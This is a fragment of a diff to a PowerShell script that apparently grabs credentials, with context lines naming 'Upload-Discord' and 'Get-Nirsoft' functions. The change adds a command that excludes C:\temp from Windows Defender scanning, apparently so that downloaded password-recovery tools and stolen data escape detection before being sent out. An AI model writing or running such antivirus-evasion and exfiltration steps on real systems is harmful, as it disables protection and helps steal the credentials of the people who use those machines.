@@ -46,4 +46,5 @@ function Upload-Discord {
 }
 
 TempDir
+Add-MpPreference -ExclusionPath "C:\temp"
 Get-Nirsoft
